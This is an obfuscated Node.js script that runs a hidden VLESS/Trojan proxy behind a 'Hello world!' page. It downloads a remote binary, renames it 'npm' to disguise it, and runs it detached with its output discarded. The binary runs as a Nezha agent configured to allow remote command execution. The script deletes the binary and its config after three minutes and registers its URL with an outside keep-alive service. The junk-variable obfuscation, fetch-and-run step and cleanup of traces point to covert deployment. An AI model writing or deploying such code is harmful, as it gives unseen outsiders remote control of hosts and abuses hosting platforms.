var _0x118b9a;const os=require('os');_0x118b9a="hehbeb";var _0xb33ba;const http=require('http');_0xb33ba=9+9;var _0x48a93c;const fs=require('fs');_0x48a93c=3+6;const axios=require('axios');var _0xd7ff;const net=require('net');_0xd7ff="gbgfii";var _0x8d_0xe53=7+6;const path=require('path');_0x8d_0xe53="mfgjmg";const crypto=require('crypto');const{"Buffer":Buffer}=require('buffer');const{"exec":exec,"execSync":execSync}=require('child_process');const{"WebSocket":WebSocket,"createWebSocketStream":createWebSocketStream}=require('ws');var _0xedd6dc;const UUID=process.env.UUID||'a4d701d2-5654-4700-aa38-57610cf57762';_0xedd6dc=2+1;const NEZHA_SERVER=process.env.NEZHA_SERVER||'';var _0x61gea=9+5;const NEZHA_PORT=process.env.NEZHA_PORT||'';_0x61gea="jlqgoh";var _0xe_0x9cb=9+5;const NEZHA_KEY=process.env.NEZHA_KEY||'';_0xe_0x9cb="bgkmek";const DOMAIN=process.env.DOMAIN||'1234.abc.com';const AUTO_ACCESS=process.env.AUTO_ACCESS||false;var _0xf418d;const WSPATH=process.env.WSPATH||UUID.slice(0,8);_0xf418d=3+0;var _0xaa6db;const SUB_PATH=process.env.SUB_PATH||'ssub';_0xaa6db=2+8;var _0xb9d5d=1+0;const NAME=process.env.NAME||'';_0xb9d5d=9+2;const PORT=process.env.PORT||3000;var _0x532adf=7+5;let ISP='';_0x532adf="ihconf";var _0xc04b=2+6;const GetISP=async()=>{try{var _0xd_0x13e;const res=await axios.get('https://speed.cloudflare.com/meta');_0xd_0x13e=0;const data=res.data;ISP=`${data.country}-${data.asOrganization}`.replace(new RegExp(" ","g"),'_');}catch(e){ISP='Unknown';}};_0xc04b=4+4;GetISP();var _0x1741a;const httpServer=http.createServer((req,res)=>{if(req.url==='/'){var _0x2eaf=8+5;const filePath=path.join(__dirname,'index.html');_0x2eaf=4+6;fs.readFile(filePath,'utf8',(err,content)=>{if(err){res.writeHead(200,{'Content-Type':'text/html'});res.end('Hello world!');return;}res.writeHead(200,{'Content-Type':'text/html'});res.end(content);});return;}else if(req.url===`/${SUB_PATH}`){const namePart=NAME?`${NAME}-${ISP}`:ISP;var _0x87435b;const vlessURL=`vless://${UUID}@cdns.doon.eu.org:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;_0x87435b="oijikn";var _0x1b559b=0+5;const trojanURL=`trojan://${UUID}@cdns.doon.eu.org:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;_0x1b559b="jgfbli";var _0xg34fc=6+0;const subscription=vlessURL+'\n'+trojanURL;_0xg34fc="capbbg";const base64Content=Buffer.from(subscription).toString('base64');res.writeHead(200,{'Content-Type':'text/plain'});res.end(base64Content+'\n');}else{res.writeHead(404,{'Content-Type':'text/plain'});res.end('Not Found\n');}});_0x1741a=1+7;const wss=new WebSocket.Server({"server":httpServer});var _0xg22e=8+5;const uuid=UUID.replace(new RegExp("-","g"),"");_0xg22e=5+8;var _0x43aa;const DNS_SERVERS=['8.8.4.4','1.1.1.1'];_0x43aa="icnapn";function resolveHost(host){return new Promise((resolve,reject)=>{if(new RegExp("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$","").test(host)){resolve(host);return;}let attempts=0;function tryNextDNS(){if(attempts>=DNS_SERVERS.length){reject(new Error(`Failed to resolve ${host} with all DNS servers`));return;}var _0x5e8d1a;const dnsServer=DNS_SERVERS[attempts];_0x5e8d1a=3+8;attempts++;var _0x9df0d;const dnsQuery=`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`;_0x9df0d=0;axios.get(dnsQuery,{"timeout":5000,"headers":{'Accept':'application/dns-json'}}).then(response=>{var _0xbe89b;const data=response.data;_0xbe89b=0+7;if(data.Status===0&&data.Answer&&data.Answer.length>0){var _0x1fc91f=6+3;const ip=data.Answer.find(record=>record.type===1);_0x1fc91f=8+7;if(ip){resolve(ip.data);return;}}tryNextDNS();}).catch(error=>{tryNextDNS();});}tryNextDNS();});}function handleVlessConnection(ws,msg){const[VERSION]=msg;var _0x76ce5a;const id=msg.slice(1,17);_0x76ce5a="hqpklb";if(!id.every((v,i)=>v==parseInt(uuid.substr(i*2,2),16)))return false;let i=msg.slice(17,18).readUInt8()+19;var _0x34eff;const port=msg.slice(i,i+=2).readUInt16BE(0);_0x34eff=8+1;const ATYP=msg.slice(i,i+=1).readUInt8();const host=ATYP==1?msg.slice(i,i+=4).join('.'):ATYP==2?new TextDecoder().decode(msg.slice(i+1,i+=1+msg.slice(i,i+1).readUInt8())):ATYP==3?msg.slice(i,i+=16).reduce((s,b,i,a)=>i%2?s.concat(a.slice(i-1,i+1)):s,[]).map(b=>b.readUInt16BE(0).toString(16)).join(':'):'';ws.send(new Uint8Array([VERSION,0]));var _0x47d=1+7;const duplex=createWebSocketStream(ws);_0x47d=8+2;resolveHost(host).then(resolvedIP=>{net.connect({"host":resolvedIP,"port":port},function(){this.write(msg.slice(i));duplex.on('error',()=>{}).pipe(this).on('error',()=>{}).pipe(duplex);}).on('error',()=>{});}).catch(error=>{net.connect({"host":host,"port":port},function(){this.write(msg.slice(i));duplex.on('error',()=>{}).pipe(this).on('error',()=>{}).pipe(duplex);}).on('error',()=>{});});return true;}function handleTrojanConnection(ws,msg){try{if(msg.length<58)return false;const receivedPasswordHash=msg.slice(0,56).toString();const possiblePasswords=[UUID];let matchedPassword=null;for(const pwd of possiblePasswords){const hash=crypto.createHash('sha224').update(pwd).digest('hex');if(hash===receivedPasswordHash){matchedPassword=pwd;break;}}if(!matchedPassword)return false;var _0xf943b=7+4;let offset=56;_0xf943b=1+0;if(msg[offset]===0x0d&&msg[offset+1]===0x0a){offset+=2;}var _0x20d21d=0+9;const cmd=msg[offset];_0x20d21d=7;if(cmd!==0x01)return false;offset+=1;var _0x_0xag9;const atyp=msg[offset];_0x_0xag9=7+2;offset+=1;let host,port;if(atyp===0x01){host=msg.slice(offset,offset+4).join('.');offset+=4;}else if(atyp===0x03){var _0x3dea3f=8+9;const hostLen=msg[offset];_0x3dea3f=3+1;offset+=1;host=msg.slice(offset,offset+hostLen).toString();offset+=hostLen;}else if(atyp===0x04){host=msg.slice(offset,offset+16).reduce((s,b,i,a)=>i%2?s.concat(a.slice(i-1,i+1)):s,[]).map(b=>b.readUInt16BE(0).toString(16)).join(':');offset+=16;}else{return false;}port=msg.readUInt16BE(offset);offset+=2;if(offset<msg.length&&msg[offset]===0x0d&&msg[offset+1]===0x0a){offset+=2;}var _0xd2_0xe72;const duplex=createWebSocketStream(ws);_0xd2_0xe72=9+8;resolveHost(host).then(resolvedIP=>{net.connect({"host":resolvedIP,"port":port},function(){if(offset<msg.length){this.write(msg.slice(offset));}duplex.on('error',()=>{}).pipe(this).on('error',()=>{}).pipe(duplex);}).on('error',()=>{});}).catch(error=>{net.connect({"host":host,"port":port},function(){if(offset<msg.length){this.write(msg.slice(offset));}duplex.on('error',()=>{}).pipe(this).on('error',()=>{}).pipe(duplex);}).on('error',()=>{});});return true;}catch(error){return false;}}wss.on('connection',(ws,req)=>{var _0x6de=1+1;const url=req.url||'';_0x6de=0;ws.once('message',msg=>{if(msg.length>17&&msg[0]===0){const id=msg.slice(1,17);const isVless=id.every((v,i)=>v==parseInt(uuid.substr(i*2,2),16));if(isVless){if(!handleVlessConnection(ws,msg)){ws.close();}return;}}if(!handleTrojanConnection(ws,msg)){ws.close();}}).on('error',()=>{});});var _0x80ee1d=4+8;const getDownloadUrl=()=>{const arch=os.arch();if(arch==='arm'||arch==='arm64'||arch==='aarch64'){if(!NEZHA_PORT){return'https://arm64.ssss.nyc.mn/v1';}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return'https://amd64.ssss.nyc.mn/agent';}}};_0x80ee1d=3+8;var _0xaa327b=2+0;const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{var _0xa93e6c=3+4;const url=getDownloadUrl();_0xa93e6c=1;const response=await axios({"method":'get',"url":url,"responseType":'stream'});const writer=fs.createWriteStream('npm');response.data.pipe(writer);return new Promise((resolve,reject)=>{writer.on('finish',()=>{console.log('npm download successfully');exec('chmod +x npm',err=>{if(err)reject(err);resolve();});});writer.on('error',reject);});}catch(err){throw err;}};_0xaa327b="anohke";var _0xc86d1g=7+4;const runnz=async()=>{try{const status=execSync('ps aux | grep -v "grep" | grep "./[n]pm"',{"encoding":'utf-8'});if(status.trim()!==''){console.log('npm is already running, skip running...');return;}}catch(e){}await downloadFile();var _0xc85d=9+6;let command='';_0xc85d=3+9;var _0xd78be=3+7;let tlsPorts=['443','8443','2096','2087','2083','2053'];_0xd78be=0+8;if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){var _0xf_0x68g=8+5;const NEZHA_TLS=tlsPorts.includes(NEZHA_PORT)?'--tls':'';_0xf_0x68g=1+4;command=`setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){var _0x9dc;const port=NEZHA_SERVER.includes(':')?NEZHA_SERVER.split(':').pop():'';_0x9dc="ngockj";const NZ_TLS=tlsPorts.includes(port)?'true':'false';var _0x08c26b;const configYaml=`client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;_0x08c26b=6+8;fs.writeFileSync('config.yaml',configYaml);}command=`setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;}else{console.log('NEZHA variable is empty, skip running');return;}try{exec(command,{"shell":'/bin/bash'},err=>{if(err)console.error('npm running error:',err);else console.log('npm is running');});}catch(error){console.error(`error: ${error}`);}};_0xc86d1g="khjnbg";async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const fullURL=`https://${DOMAIN}/${SUB_PATH}`;try{var _0xa9ce;const res=await axios.post("https://oooo.serv00.net/add-url",{"url":fullURL},{"headers":{'Content-Type':'application/json'}});_0xa9ce=6+3;console.log('Automatic Access Task added successfully');}catch(error){}}const delFiles=()=>{fs.unlink('npm',()=>{});fs.unlink('config.yaml',()=>{});};httpServer.listen(PORT,()=>{runnz();setTimeout(()=>{delFiles();},180000);addAccessTask();console.log(`Server is running on port ${PORT}`);});
